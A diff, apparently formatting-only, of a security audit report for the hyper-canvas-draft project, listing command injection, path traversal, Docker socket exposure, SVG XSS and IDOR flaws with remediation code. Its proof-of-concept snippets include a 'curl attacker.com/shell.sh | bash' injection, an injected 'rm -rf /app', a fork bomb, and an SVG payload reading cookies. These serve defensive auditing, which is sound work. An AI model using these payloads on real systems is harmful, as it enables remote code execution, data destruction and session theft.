@@ -19,23 +19,23 @@ This security audit of hyper-canvas-draft identified **5 CRITICAL**, **4 HIGH**,
 
 ## Vulnerability Summary
 
-| ID | Severity | Category | Location | CVSS Est. |
-|----|----------|----------|----------|-----------|
-| VULN-001 | CRITICAL | Command Injection | `docker-manager.ts:109-118` | 9.8 |
-| VULN-002 | CRITICAL | Shell Injection | `runTests.ts:49-62` | 9.8 |
-| VULN-003 | CRITICAL | Path Traversal | `listImages.ts:123-128` | 8.6 |
-| VULN-004 | CRITICAL | Missing Resource Limits | `docker-manager.ts` | 7.5 |
-| VULN-005 | CRITICAL | Docker Socket Exposure | `Dockerfile`, `k8s/` | 9.0 |
-| VULN-006 | HIGH | Path Traversal | `main.ts:56-90` (WebSocket) | 7.5 |
-| VULN-007 | HIGH | Command Injection | `docker-manager.ts:140-145` | 8.1 |
-| VULN-008 | HIGH | XSS via SVG | `uploadImage.ts` | 6.1 |
-| VULN-009 | HIGH | Input Validation | `canvasComposition.ts` | 6.5 |
-| VULN-010 | MEDIUM | Rate Limiting | Global | 5.3 |
-| VULN-011 | MEDIUM | Symlink Attack | `readFile.ts`, `writeFile.ts` | 5.5 |
-| VULN-012 | MEDIUM | Parameter Pollution | `writeFile.ts` | 4.3 |
-| VULN-015 | ✅ FIXED | IDOR | Multiple routes (see below) | 8.5 |
-| VULN-016 | MEDIUM | Weak Random | `user-settings.ts:99` | 4.5 |
-| VULN-017 | MEDIUM | Rate Limiting | `/api/user/email/verify*` | 5.3 |
+| ID       | Severity | Category                | Location                      | CVSS Est. |
+| -------- | -------- | ----------------------- | ----------------------------- | --------- |
+| VULN-001 | CRITICAL | Command Injection       | `docker-manager.ts:109-118`   | 9.8       |
+| VULN-002 | CRITICAL | Shell Injection         | `runTests.ts:49-62`           | 9.8       |
+| VULN-003 | CRITICAL | Path Traversal          | `listImages.ts:123-128`       | 8.6       |
+| VULN-004 | CRITICAL | Missing Resource Limits | `docker-manager.ts`           | 7.5       |
+| VULN-005 | CRITICAL | Docker Socket Exposure  | `Dockerfile`, `k8s/`          | 9.0       |
+| VULN-006 | HIGH     | Path Traversal          | `main.ts:56-90` (WebSocket)   | 7.5       |
+| VULN-007 | HIGH     | Command Injection       | `docker-manager.ts:140-145`   | 8.1       |
+| VULN-008 | HIGH     | XSS via SVG             | `uploadImage.ts`              | 6.1       |
+| VULN-009 | HIGH     | Input Validation        | `canvasComposition.ts`        | 6.5       |
+| VULN-010 | MEDIUM   | Rate Limiting           | Global                        | 5.3       |
+| VULN-011 | MEDIUM   | Symlink Attack          | `readFile.ts`, `writeFile.ts` | 5.5       |
+| VULN-012 | MEDIUM   | Parameter Pollution     | `writeFile.ts`                | 4.3       |
+| VULN-015 | ✅ FIXED | IDOR                    | Multiple routes (see below)   | 8.5       |
+| VULN-016 | MEDIUM   | Weak Random             | `user-settings.ts:99`         | 4.5       |
+| VULN-017 | MEDIUM   | Rate Limiting           | `/api/user/email/verify*`     | 5.3       |
 
 ---
 
@@ -75,6 +75,7 @@ installCommand: "npm install"; curl attacker.com/shell.sh | bash #"
 ```
 
 Results in:
+
 ```bash
 docker run -d ... -e INSTALL_COMMAND="npm install"; curl attacker.com/shell.sh | bash #"
 ```
@@ -95,13 +96,19 @@ Replace `execAsync()` with `spawn()` using array arguments:
 import { spawn } from 'node:child_process';
 
 const args = [
-  'run', '-d',
-  '--name', containerName,
-  '-v', `${project.path}:/app`,
-  '-p', `${project.port}:${project.internalPort}`,
-  '-e', `INSTALL_COMMAND=${project.installCommand}`,
-  '-e', `DEV_COMMAND=${devCommand}`,
-  imageName
+  'run',
+  '-d',
+  '--name',
+  containerName,
+  '-v',
+  `${project.path}:/app`,
+  '-p',
+  `${project.port}:${project.internalPort}`,
+  '-e',
+  `INSTALL_COMMAND=${project.installCommand}`,
+  '-e',
+  `DEV_COMMAND=${devCommand}`,
+  imageName,
 ];
 
 const process = spawn('docker', args);
@@ -146,6 +153,7 @@ POST /api/run-tests
 ```
 
 Generates command:
+
 ```bash
 npx vitest run --reporter=verbose "test.ts"; rm -rf /app #"
 ```
@@ -174,9 +182,7 @@ The `subdirectory` query parameter is not validated, allowing traversal outside 
 #### Vulnerable Code
 
 ```typescript
-const scanPath = subdirectory
-  ? join(publicDirPath, subdirectory)
-  : publicDirPath;
+const scanPath = subdirectory ? join(publicDirPath, subdirectory) : publicDirPath;
 
 const images = await scanForImages(scanPath, publicDirPath);
 ```
@@ -233,13 +239,18 @@ docker run -d \
 #### Proof of Concept
 
 Project code:
+
 ```javascript
 // Fork bomb
-while(true) { require('child_process').fork(__filename); }
+while (true) {
+  require('child_process').fork(__filename);
+}
 
 // Memory exhaustion
 const data = [];
-while(true) { data.push(new Array(1000000).fill('x')); }
+while (true) {
+  data.push(new Array(1000000).fill('x'));
+}
 ```
 
 #### Remediation
@@ -248,8 +259,10 @@ Add resource limits to container startup:
 
 ```typescript
 const args = [
-  'run', '-d',
-  '--name', containerName,
+  'run',
+  '-d',
+  '--name',
+  containerName,
   '--memory=1g',
   '--memory-swap=1g',
   '--cpus=2',
@@ -259,9 +272,11 @@ const args = [
   '--cap-add=CHOWN',
   '--cap-add=SETUID',
   '--cap-add=SETGID',
-  '-v', `${project.path}:/app`,
-  '-p', `${project.port}:${project.internalPort}`,
-  imageName
+  '-v',
+  `${project.path}:/app`,
+  '-p',
+  `${project.port}:${project.internalPort}`,
+  imageName,
 ];
 ```
 
@@ -295,7 +310,7 @@ volumes:
     hostPath:
       path: /var/run/docker.sock
 securityContext:
-  runAsUser: 0  # ROOT
+  runAsUser: 0 # ROOT
 ```
 
 #### Attack Scenario
@@ -317,7 +332,7 @@ securityContext:
 # If socket access is required, use restricted access:
 securityContext:
   runAsUser: 1001
-  runAsGroup: 999  # docker group
+  runAsGroup: 999 # docker group
   readOnlyRootFilesystem: true
 ```
 
@@ -338,10 +353,10 @@ WebSocket path is stored and forwarded without complete validation, potentially 
 ```typescript
 const projectIdMatch = pathname.match(/^\/project-preview\/([a-f0-9-]+)/);
 if (!projectIdMatch) {
-  return new Response("Invalid project path", { status: 400 });
+  return new Response('Invalid project path', { status: 400 });
 }
 const projectId = projectIdMatch[1];
-const path: string = pathname + url.search;  // Stored as-is
+const path: string = pathname + url.search; // Stored as-is
 
 // Later:
 const backendUrl = `ws://localhost:${data.projectPort}${data.path}`;
@@ -361,7 +376,7 @@ The regex only validates the beginning of the path, not what follows.
 // Validate entire path structure
 const pathAfterProject = pathname.slice(projectIdMatch[0].length);
 if (pathAfterProject.includes('..') || pathAfterProject.includes('//')) {
-  return new Response("Invalid path", { status: 400 });
+  return new Response('Invalid path', { status: 400 });
 }
 ```
 
@@ -377,13 +392,14 @@ if (pathAfterProject.includes('..') || pathAfterProject.includes('//')) {
 
 ```typescript
 const artifacts = ['.next', 'dist', '.vite', 'out'];
-const paths = artifacts.map(a => `"${project.path}/${a}"`).join(' ');
+const paths = artifacts.map((a) => `"${project.path}/${a}"`).join(' ');
 await execAsync(`rm -rf ${paths}`);
 ```
 
 #### Proof of Concept
 
 If `project.path` contains backticks:
+
 ```
 project.path: "/projects/test`id`"
 ```
@@ -416,6 +432,7 @@ SVG files can contain JavaScript that executes when the image is viewed.
 #### Proof of Concept
 
 Upload SVG with:
+
 ```xml
 <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
   <rect width="100" height="100"/>
@@ -482,11 +499,14 @@ No rate limiting on API endpoints allows brute force and DoS attacks.
 ```typescript
 import { rateLimiter } from 'hono-rate-limiter';
 
-app.use('/api/*', rateLimiter({
-  windowMs: 60 * 1000, // 1 minute
-  limit: 100,
-  keyGenerator: (c) => c.req.header('x-forwarded-for') || 'anonymous',
-}));
+app.use(
+  '/api/*',
+  rateLimiter({
+    windowMs: 60 * 1000, // 1 minute
+    limit: 100,
+    keyGenerator: (c) => c.req.header('x-forwarded-for') || 'anonymous',
+  }),
+);
 ```
 
 ---
@@ -556,10 +576,10 @@ The JWT implementation was specifically audited per user request. Findings:
 
 ### Token Types
 
-| Type | Storage | TTL | Claims |
-|------|---------|-----|--------|
-| Access Token | Memory (Zustand) | 15 min | sub, email, type |
-| Refresh Token | httpOnly Cookie + DB hash | 7 days | sub, jti, type |
+| Type          | Storage                   | TTL    | Claims           |
+| ------------- | ------------------------- | ------ | ---------------- |
+| Access Token  | Memory (Zustand)          | 15 min | sub, email, type |
+| Refresh Token | httpOnly Cookie + DB hash | 7 days | sub, jti, type   |
 
 ### Security Controls
 
@@ -605,18 +625,18 @@ The JWT implementation was specifically audited per user request. Findings:
 
 ## Files Requiring Modification
 
-| File | Vulnerabilities |
-|------|-----------------|
-| `server/services/docker-manager.ts` | VULN-001, VULN-004, VULN-007 |
-| `server/routes/runTests.ts` | VULN-002 |
-| `server/routes/listImages.ts` | VULN-003 |
-| `server/main.ts` | VULN-006 |
-| `server/routes/uploadImage.ts` | VULN-008 |
-| `server/routes/canvasComposition.ts` | VULN-009 |
-| `server/routes/readFile.ts` | VULN-011 |
-| `server/routes/writeFile.ts` | VULN-011, VULN-012 |
-| `Dockerfile` | VULN-005 |
-| `k8s/base/hypercanvas.yaml` | VULN-005 |
+| File                                 | Vulnerabilities              |
+| ------------------------------------ | ---------------------------- |
+| `server/services/docker-manager.ts`  | VULN-001, VULN-004, VULN-007 |
+| `server/routes/runTests.ts`          | VULN-002                     |
+| `server/routes/listImages.ts`        | VULN-003                     |
+| `server/main.ts`                     | VULN-006                     |
+| `server/routes/uploadImage.ts`       | VULN-008                     |
+| `server/routes/canvasComposition.ts` | VULN-009                     |
+| `server/routes/readFile.ts`          | VULN-011                     |
+| `server/routes/writeFile.ts`         | VULN-011, VULN-012           |
+| `Dockerfile`                         | VULN-005                     |
+| `k8s/base/hypercanvas.yaml`          | VULN-005                     |
 
 ---
 
@@ -642,10 +662,10 @@ wscat -c "ws://localhost:8080/project-preview/{id}/../../../admin"
 
 ### Fixed Vulnerabilities
 
-| ID | Status | Fix |
-|----|--------|-----|
-| VULN-010 | ✅ FIXED | Rate limiting via Traefik IngressRoutes |
-| VULN-016 | ✅ FIXED | Replaced `Math.random()` with `node:crypto` |
+| ID       | Status   | Fix                                           |
+| -------- | -------- | --------------------------------------------- |
+| VULN-010 | ✅ FIXED | Rate limiting via Traefik IngressRoutes       |
+| VULN-016 | ✅ FIXED | Replaced `Math.random()` with `node:crypto`   |
 | VULN-017 | ✅ FIXED | Rate limiting for email verification endpoint |
 
 ---
@@ -660,25 +680,25 @@ Multiple API endpoints accept resource IDs (projectId, chatId, etc.) without ver
 
 **Affected Endpoints:**
 
-| Endpoint | Risk | Issue |
-|----------|------|-------|
-| `GET /api/ai-agent/chats` | CRITICAL | Access any project's chats |
-| `GET /api/ai-agent/chats/:chatId/messages` | CRITICAL | Read any chat's messages |
-| `DELETE /api/ai-agent/chats/:chatId` | CRITICAL | Delete any chat |
-| `POST /api/ai-agent/chat` | CRITICAL | Send messages to any project |
-| `GET /api/auto-fix/:sessionId` | CRITICAL | Access any fix session |
-| `GET /api/auto-fix/project/:projectId` | CRITICAL | Access any project's sessions |
-| `GET /api/ai-config` | CRITICAL | Read any workspace's AI config |
-| `PUT /api/ai-config` | CRITICAL | Modify any workspace's AI config |
-| `POST /api/docker/start/:id` | CRITICAL | Start any project's container |
-| `POST /api/docker/stop/:id` | CRITICAL | Stop any project's container |
-| `GET /api/docker/logs/:id` | CRITICAL | Read any project's logs |
-| `GET /api/read-file` | CRITICAL | Read files from any project |
-| `POST /api/write-file` | CRITICAL | Write files to any project |
-| `GET /api/git/*` | HIGH | Git operations on any project |
-| `*  /api/canvas-composition/*` | HIGH | No authMiddleware |
-| `*  /api/sample-renderer/*` | HIGH | No authMiddleware |
-| 20+ legacy routes | HIGH | No authMiddleware |
+| Endpoint                                   | Risk     | Issue                            |
+| ------------------------------------------ | -------- | -------------------------------- |
+| `GET /api/ai-agent/chats`                  | CRITICAL | Access any project's chats       |
+| `GET /api/ai-agent/chats/:chatId/messages` | CRITICAL | Read any chat's messages         |
+| `DELETE /api/ai-agent/chats/:chatId`       | CRITICAL | Delete any chat                  |
+| `POST /api/ai-agent/chat`                  | CRITICAL | Send messages to any project     |
+| `GET /api/auto-fix/:sessionId`             | CRITICAL | Access any fix session           |
+| `GET /api/auto-fix/project/:projectId`     | CRITICAL | Access any project's sessions    |
+| `GET /api/ai-config`                       | CRITICAL | Read any workspace's AI config   |
+| `PUT /api/ai-config`                       | CRITICAL | Modify any workspace's AI config |
+| `POST /api/docker/start/:id`               | CRITICAL | Start any project's container    |
+| `POST /api/docker/stop/:id`                | CRITICAL | Stop any project's container     |
+| `GET /api/docker/logs/:id`                 | CRITICAL | Read any project's logs          |
+| `GET /api/read-file`                       | CRITICAL | Read files from any project      |
+| `POST /api/write-file`                     | CRITICAL | Write files to any project       |
+| `GET /api/git/*`                           | HIGH     | Git operations on any project    |
+| `*  /api/canvas-composition/*`             | HIGH     | No authMiddleware                |
+| `*  /api/sample-renderer/*`                | HIGH     | No authMiddleware                |
+| 20+ legacy routes                          | HIGH     | No authMiddleware                |
 
 **Proof of Concept:**
 
@@ -712,10 +732,7 @@ curl -X POST -H "Authorization: Bearer $ATTACKER_TOKEN" \
 // server/middleware/workspace-access.ts
 export async function checkWorkspaceAccess(userId: string, workspaceId: string): Promise<boolean> {
   const membership = await db.query.workspaceMembers.findFirst({
-    where: and(
-      eq(workspaceMembers.userId, userId),
-      eq(workspaceMembers.workspaceId, workspaceId)
-    ),
+    where: and(eq(workspaceMembers.userId, userId), eq(workspaceMembers.workspaceId, workspaceId)),
   });
   return !!membership;
 }
@@ -736,23 +753,23 @@ if (!hasAccess) return c.json({ error: 'Access denied' }, 403);
 
 **Files Modified (commit 10601173):**
 
-| File | Changes Made |
-|------|--------------|
-| `server/middleware/workspace.ts` | Added checkProjectAccess, checkWorkspaceAccess helpers |
-| `server/routes/ai-agent-chats.ts` | ✅ Added workspace checks to all 5 handlers |
-| `server/routes/ai-agent.ts` | ✅ Added workspace check to chat handler |
-| `server/routes/autoFix.ts` | ✅ Added access checks to all 6 handlers |
-| `server/routes/generatePreview.ts` | ✅ Added access checks to AI config endpoints |
-| `server/routes/docker.ts` | ✅ Added access checks to all container handlers |
-| `server/index.ts` | ✅ Added authMiddleware to Docker/AI/Auto-Fix routes |
+| File                               | Changes Made                                           |
+| ---------------------------------- | ------------------------------------------------------ |
+| `server/middleware/workspace.ts`   | Added checkProjectAccess, checkWorkspaceAccess helpers |
+| `server/routes/ai-agent-chats.ts`  | ✅ Added workspace checks to all 5 handlers            |
+| `server/routes/ai-agent.ts`        | ✅ Added workspace check to chat handler               |
+| `server/routes/autoFix.ts`         | ✅ Added access checks to all 6 handlers               |
+| `server/routes/generatePreview.ts` | ✅ Added access checks to AI config endpoints          |
+| `server/routes/docker.ts`          | ✅ Added access checks to all container handlers       |
+| `server/index.ts`                  | ✅ Added authMiddleware to Docker/AI/Auto-Fix routes   |
 
 **Remaining (lower priority):**
 
-| File | Status |
-|------|--------|
-| `server/routes/comments.ts` | Uses workspace routing |
+| File                             | Status                 |
+| -------------------------------- | ---------------------- |
+| `server/routes/comments.ts`      | Uses workspace routing |
 | `server/routes/subscriptions.ts` | Uses workspace routing |
-| Legacy component routes | No user data exposure |
+| Legacy component routes          | No user data exposure  |
 
 ---
 
